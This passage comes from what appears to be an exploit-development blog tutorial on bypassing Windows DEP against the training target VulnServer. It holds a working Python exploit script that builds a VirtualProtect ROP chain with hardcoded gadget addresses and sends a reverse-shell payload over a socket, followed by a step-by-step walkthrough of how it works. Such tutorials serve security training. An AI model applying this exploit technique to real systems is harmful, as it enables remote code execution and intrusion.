anything, using gadget address)\n# EBX - Setup Size parameter (0x201) for VirtualProtect\nrop += struct.pack(\"&#x3C;I\", 0x75f366b4)  # POP EAX # RETN [KERNELBASE.dll]\nrop += struct.pack(\"&#x3C;I\", 0xfffffdff)  # Load -0x201 into EAX\nrop += struct.pack(\"&#x3C;I\", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL] (EAX = 0x201)\nrop += struct.pack(\"&#x3C;I\", 0x77597926)  # XCHG EAX,EBX # RETN [msvcrt.dll] (EBX = 0x201)\n# EDX - Setup Protection flag (0x40) for VirtualProtect\nrop += struct.pack(\"&#x3C;I\", 0x75d91838)  # POP EAX # RETN [KERNELBASE.dll]\nrop += struct.pack(\"&#x3C;I\", 0xffffffc0)  # Load -0x40 into EAX\nrop += struct.pack(\"&#x3C;I\", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL] (EAX = 0x40)\nrop += struct.pack(\"&#x3C;I\", 0x77d9e6c0)  # XCHG EAX,EDX # RETN [ntdll.dll] (EDX = 0x40)\n# ECX - Setup lpflOldProtect parameter for VirtualProtect\nrop += struct.pack(\"&#x3C;I\", 0x775f94ee)  # POP ECX # RETN [msvcrt.dll]\nrop += struct.pack(\"&#x3C;I\", 0x7653a3c1)  # &#x26;Writable location [KERNEL32.DLL] (ECX = ptr)\n# EDI - Setup Return Address (used as ROP NOP here)\nrop += struct.pack(\"&#x3C;I\", 0x76fe83f7)  # POP EDI # RETN [WS2_32.DLL]\nrop += struct.pack(\"&#x3C;I\", 0x7650580a)  # RETN (ROP NOP) [KERNEL32.DLL]\n# ESI - Setup Pointer to JMP [EAX] gadget (used after PUSHAD)\nrop += struct.pack(\"&#x3C;I\", 0x76525760)  # POP ESI # RETN [KERNEL32.DLL]\nrop += struct.pack(\"&#x3C;I\", 0x75e95833)  # JMP [EAX] [KERNELBASE.dll]\n# EAX - Setup Pointer to VirtualProtect IAT entry\nrop += struct.pack(\"&#x3C;I\", 0x75ee5082)  # POP EAX # RETN [KERNELBASE.dll]\nrop += struct.pack(\"&#x3C;I\", 0x6250609c)  # ptr to &#x26;VirtualProtect() [IAT essfunc.dll]\n# PUSHAD - Push registers to stack for VirtualProtect call\nrop += struct.pack(\"&#x3C;I\", 0x775d6f67)  # PUSHAD # RETN [msvcrt.dll]\n# JMP ESP - Return address after VirtualProtect, jumps to shellcode\nrop += struct.pack(\"&#x3C;I\", 0x625011c7)  # ptr to 'jmp esp' [essfunc.dll]\n\n# Add NOP sled and shellcode\nnop = b\"\\x90\" * 16\nfinal_rop = rop + nop + buf # Note: Place shellcode 'buf' after NOPs\n\n# Build the final payload\npayload = VULNSRVR_CMD\npayload += b\"A\" * OFFSET\npayload += final_rop # Use the ROP chain including NOPs and shellcode\npayload += b\"C\" * (TOTAL_BUFFER_LEN - len(payload)) # Padding\n\n# Send the exploit\nwith socket.create_connection(target) as sock:\n    sock.recv(512)  # Welcome message\n    sent = sock.send(payload)\n    print(f\"sent {sent} bytes\")\n    print(\"[x] Exploit sent\")\n</code></pre>\n<h2>8. Understanding How the Exploit Works</h2>\n<p>This exploit uses a <code>JMP [EAX]</code> technique combined with <code>PUSHAD</code> to call <code>VirtualProtect</code> and make our shellcode executable:</p>\n<ol>\n<li>The initial buffer fills memory until it overwrites the saved <code>EIP</code> register at the <code>2003</code> byte offset.</li>\n<li>EIP is overwritten with the address of the first gadget in our ROP chain (e.g., the <code>POP EBP</code> gadget used for alignment/setup).</li>\n<li>The ROP chain executes sequentially: Gadgets pop values into <code>EBP</code>, <code>EBX</code>, <code>EDX</code>, <code>EBX</code>, <code>ESP</code>, <code>EBP</code>, <code>ESI</code>, <code>EDI</code>, setting them up according to our plan.</li>\n<li>Crucially, just before <code>PUSHAD</code>:</li>\n</ol>\n<ul>\n<li><code>EAX</code> holds the address of the VirtualProtect IAT pointer (<code>0x6250609c</code>).</li>\n<li><code>ESI</code> holds the address of a <code>JMP DWORD PTR [EAX]</code> gadget (<code>0x75e95833</code>).</li>\n<li><code>EBX</code>, <code>EDX</code>, <code>ECX</code> hold the required parameters for <code>VirtualProtect</code> (<code>dwSize</code>, <code>flNewProtect</code>, <code>lpflOldProtect</code>).</li>\n<li><code>EDI</code> and <code>EBP</code> hold placeholders or <code>ROP NOP</code>s.</li>\n</ul>\n<ol start=\"5\">\n<li>The <code>PUSHAD</code> instruction (<code>0x775d6f67</code>) executes. It pushes the current values of <code>EAX</code>, <code>ECX</code>, <code>EDX</code>, <code>EBX</code>, <code>ESP</code> (original value before <code>PUSHAD</code>), <code>EBP</code>, <code>ESI</code>, <code>EDI</code> onto the stack. This arranges the parameters needed by <code>VirtualProtect</code> at known offsets from the current stack pointer <code>ESP</code>.</li>\n<li>The <code>RETN</code> instruction that is part of the <code>PUSHAD # RETN</code> gadget executes. It pops the next value from the stack into <code>EIP</code>. Crucially, the way the ROP chain is constructed and aligned means this value popped is the address we loaded into <code>ESI</code> (<code>0x75e95833</code>, the address of the <code>JMP DWORD PTR [EAX]</code> gadget). (Assuming the intended technique works as described).</li>\n<li>Execution jumps to the <code>JMP DWORD PTR [EAX]</code> gadget.</li>\n<li>This gadget then jumps to the address currently stored in <code>EAX</code>, which is the address of the <code>VirtualProtect</code> IAT entry (<code>0x6250609c</code>).</li>\n<li><code>VirtualProtect</code> executes. It finds its parameters on the stack where <code>PUSHAD</code> placed them. The <code>lpAddress</code> parameter (effectively the stack pointer <code>ESP</code> where the shellcode lies after the ROP chain arguments) indicates the memory to modify, <code>dwSize</code> is <code>0x201</code> (from <code>EBX</code> via stack), <code>flNewProtect</code> is <code>0x40</code> (from <code>EDX</code> via stack), and <code>lpflOldProtect</code> points to the writable KERNEL32 address (from <code>ECX</code> via stack). <code>VirtualProtect</code> makes the shellcode memory region executable.</li>\n<li><code>VirtualProtect</code> finishes and executes its own <code>RET</code> instruction. The return address on the stack at this point is the one originally placed after the <code>PUSHAD # RETN</code> gadget sequence in our main ROP chain: the address of our <code>JMP ESP</code> gadget (<code>0x625011c7</code>).</li>\n<li>The <code>JMP ESP</code> gadget executes, transferring control directly to the <code>NOP</code> sled and then the shellcode located immediately following it on the stack.</li>\n<li>Our shellcode executes, creating a reverse shell (or performing its intended action).</li>\n</ol>\n<h2>9. Tips and Troubleshooting</h2>\n<ol>\n<li>\n<p>Always verify gadgets in the debugger to ensure they do exactly what you expect.</p>\n</li>\n<li>\n<p>Make sure your gadget addresses don't contain any bad characters (like \\x00 in our case).</p>\n</li>\n<li>\n<p>Be aware of gadgets that affect multiple registers. For example, our \"pop ecx\" gadget also pops EDX.</p>\n</li>\n<li>\n<p>The PUSHAD technique requires careful stack alignment. Make sure the stack values are in the right order for VirtualProtect parameters.</p>\n</li>\n<li>\n<p>Use breakpoints liberally and check register values at each step to identify issues.</p>\n</li>\n<li>\n<p>If one approach doesn't work, try another. ROP chain development often requires creativity.</p>\n</li>\n</ol>\n<h2>Conclusion</h2>\n<p>Bypassing DEP might seem daunting at first, but with a methodical approach and understanding of ROP chains, it becomes a manageable challenge. By carefully selecting gadgets and leveraging Windows APIs like VirtualProtect, we can overcome even sophisticated memory protections.</p>\n<p>What's particularly elegant about this technique is how we're using the operating system's own APIs against it. Instead of trying to break DEP, we're simply asking Windows nicely to change the memory protection for us.</p>\n<p>Remember that while this technique works reliably for bypassing DEP, modern exploit mitigations rarely exist in isolation. Real-world targets often combine DEP with ASLR, CFG, and other protections that require additional bypass techniques.</p>\n<p>The most important takeaway from this exercise isn't just the specific VirtualProtect technique, but the methodology for manually building and understanding ROP chains. By mastering these fundamentals, you'll be well-equipped to tackle even more complex exploitation scenarios.</p>\n<p>Happy Overflowing!</p>\n<hr>\n<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>\n","excerpt":"Data Execution Prevention (DEP) has been a game-changer in exploit development. The days of simply overflowing a buffer, jumping to your shellcode, and calli...","title":"VirtualProtect DEP Bypass: Step-By-Step Exploit","date":"2025-04-08","tags":["Exploit Development","VulnServer","DEP Bypass","ROP","Buffer Overflow","Windows Exploitation"]}},"__N_SSG":true}